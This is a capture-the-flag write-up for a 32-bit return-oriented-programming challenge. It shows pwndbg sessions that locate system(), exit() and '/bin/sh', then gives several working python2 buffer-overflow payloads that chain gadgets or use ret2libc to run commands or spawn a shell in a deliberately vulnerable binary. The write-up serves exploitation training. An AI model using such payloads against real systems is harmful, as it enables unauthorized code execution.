### How to compile binary (disable ASLR):

`gcc roplevel2.c -o roplevel2 -fno-stack-protector -z execstack -m32 -no-pie -Wl,-z,norelro -mpreferred-stack-boundary=2`

### Analysis:

```
pwndbg> p exit
$1 = {<text variable, no debug info>} 0x8049060 <exit@plt>
pwndbg> p system
$2 = {<text variable, no debug info>} 0x8049050 <system@plt>
```

```
┌──(george93㉿kali)-[~/Desktop/Exploit-Challenges/rop/src]
└─$ strings -a -t x /usr/lib/i386-linux-gnu/libc-2.33.so | grep "/bin/sh"                                                                   
 18fb62 /bin/sh

┌──(george93㉿kali)-[~/Desktop/Exploit-Challenges/rop/src]
└─$ gdb-pwndbg roplevel2
Reading symbols from roplevel2...
(No debugging symbols found in roplevel2)
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> break main
Breakpoint 1 at 0x80491f0
pwndbg> r
Starting program: /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2 

Breakpoint 1, 0x080491f0 in main ()
...
...
...
pwndbg> info proc mappings
process 5091
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
	 0x8049000  0x804a000     0x1000     0x1000 /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
	 0x804a000  0x804b000     0x1000     0x2000 /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
	 0x804b000  0x804c000     0x1000     0x2000 /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
	0xf7db9000 0xf7dd6000    0x1d000        0x0 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7dd6000 0xf7f2e000   0x158000    0x1d000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7f2e000 0xf7fa1000    0x73000   0x175000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7fa1000 0xf7fa2000     0x1000   0x1e8000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7fa2000 0xf7fa4000     0x2000   0x1e8000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7fa4000 0xf7fa6000     0x2000   0x1ea000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7fa6000 0xf7fad000     0x7000        0x0 
	0xf7fc3000 0xf7fc5000     0x2000        0x0 
	0xf7fc5000 0xf7fc9000     0x4000        0x0 [vvar]
	0xf7fc9000 0xf7fcb000     0x2000        0x0 [vdso]
	0xf7fcb000 0xf7fcc000     0x1000        0x0 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xf7fcc000 0xf7fee000    0x22000     0x1000 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xf7fee000 0xf7ffb000     0xd000    0x23000 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xf7ffb000 0xf7ffd000     0x2000    0x2f000 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xf7ffd000 0xf7ffe000     0x1000    0x31000 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
pwndbg> x/s 0xf7db9000+0x18fb62
0xf7f48b62:	"/bin/sh"
```

```
pwndbg> find &system,+99999999,"/bin/sh"
warning: Unable to access 16007 bytes of target memory at 0x8049050, halting search.
Pattern not found.
pwndbg> break main
Breakpoint 1 at 0x80491f0
pwndbg> c
The program is not being run.
pwndbg> r
Starting program: /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
...
...
...
pwndbg> find &system,+99999999,"/bin/sh"
0xf7f48b62
warning: Unable to access 16000 bytes of target memory at 0xf7faa5ea, halting search.
1 pattern found.
```

### Methodolody:

Find gadgets to return to a System Function

### Answer for original version (I think?):

Analysis things:

```
pwndbg>  x/s 0x804a024
0x804a024:	"# this does nothing..."
pwndbg> print &str1
$10 = (<data variable, no debug info> *) 0x804b3f8 <str1>
pwndbg> print &str2
$11 = (<data variable, no debug info> *) 0x804b404 <str2>
pwndbg> print &str3
$12 = (<data variable, no debug info> *) 0x804b414 <str3>
```

Actual Exploit:

```
python2 -c "print('AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7' + '\xda\x91\x04\x08GGGG\xf8\xb3\x04\x08')" | ./roplevel2
python2 -c "print('AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7' + '\xda\x91\x04\x08GGGG\x04\xb4\x04\x08')" | ./roplevel2
python2 -c "print('AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7' + '\xda\x91\x04\x08GGGG\x14\xb4\x04\x08')" | ./roplevel2
```

- FINAL PADDING = INITIAL PADDING + EBX

- FINAL EXPLOIT = FINAL PADDING (AAAABBBBCCCCDDDDEEEE\x00\xdd\xdf\xf7) + GADGET(0x080491da) + EXIT (GGGG) + ARGUMENT (str1[], str2[], str3[])

- Gadget is called first after the 6 * "XXXX" buffer which pushes the current value of `ebx` to the top of the stack. When the gadget completes, it calls that function which is the SYSTEM function call which then looks at the top 2 values on stack for the exit address and the argument.

- 0xf7dfdd00 is the `system()` address

- 0x080491da is the gadget address

### Answer for shell version:

Using pure ret2libc:

```
(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\x00\xdd\xdf\xf7\x80\x06\xdf\xf7\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
```

- 0xf7dfdd00 is the `system()` address

- 0xf7df0680 is the `exit()` address

- 0xf7f48b62 is the `/bin/sh` address

Using gadget() function:

```
(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xda\x91\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
```

- 0x080491da is the gadget address

- 0xf7dfdd00 is the `system()` address

- 0x08049060 is the `exit()` address

- 0xf7f48b62 is the `/bin/sh` address

Using `ROPGadget --binary ./roplevel2-shellversion` (`0x080492c2 : sub al, 0x24 ; ret`):

```
(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xc2\x92\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2-shellversion
```

- 0x080492c2 is the gadget address

- 0xf7dfdd00 is the `system()` address

- 0x08049060 is the `exit()` address

- 0xf7f48b62 is the `/bin/sh` address

### Notes:

Based on the design of this challenge, the gadget function is not suitable to solve the puzzle as x86 stores parameters to functions on the stack while Mach-O stores parameters to functions in lower registers. I have since edited the challenge to allow it to be exploitable on a Linux OS via the gadget function or finding gadgets within the binary itself as well :). Due to the nature of this exploit, you can even just use a generic ret2libc attack.

You can try to obtain a root shell via a buffer overflow but on analysis of this challenge, it seems that the author wants us to execute the commands stored in str1, str2, str3 via gadget() and the winner() function call. From the author source code, I modified it and created 2 versions of the binary: One that aims to execute the commands store in str1, str2 and str3; and the other aims to obtan a shell.

Over [here](https://icyphox.sh/blog/rop-on-arm/) is a walkthrough of someone attempting the challenge and achieving code execution instead of executing the various commands stored in str1, str2, str3 as the author intended. Still a good read though.

### References:

[PUSH and POP in ARM](https://developer.arm.com/documentation/dui0068/b/Thumb-Instruction-Reference/Thumb-memory-access-instructions/PUSH-and-POP)

[LDR in ARM](https://developer.arm.com/documentation/dui0041/c/Babbfdih#)
